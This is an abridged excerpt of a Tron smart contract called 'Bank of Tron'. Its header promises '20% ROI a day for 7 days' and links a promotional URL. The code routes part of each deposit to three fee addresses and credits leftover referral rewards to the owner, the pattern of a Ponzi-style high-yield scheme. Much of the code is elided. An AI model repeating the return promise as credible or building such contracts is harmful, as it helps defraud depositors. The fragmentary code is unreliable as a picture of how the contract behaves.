...
/*
 * Bank of Tron
 * DECENTRALIZED TRON PROFITS
 * You will get 20% ROI a day for 7 days!
 * URL: https://www.bank-of-tron.club
 */
...
contract BankOfTron {
    ...
    uint private minuteRate = 1157408;
    uint private releaseTime = 1596988800;
    uint public Interest = 140;
   ...
   mapping(address => Player) public players;
    ...
    function deposit(address _affAddr) public payable {
        ...
        uint feedEarn = depositAmount.mul(devCommission).mul(5).div(commissionDivisor);
        uint marketing = depositAmount.mul(devCommission).mul(2).div(commissionDivisor);
        feed1.transfer(feedEarn);
        feed2.transfer(feedEarn);
        feed3.transfer(marketing);
    }
    ...
    function distributeRef(uint256 _trx, address _affFrom) private{
        ...
        if(_allaff > 0 ){
            ...
            players[owner].affRewards = players[owner].affRewards.add(_allaff);
        }
    }
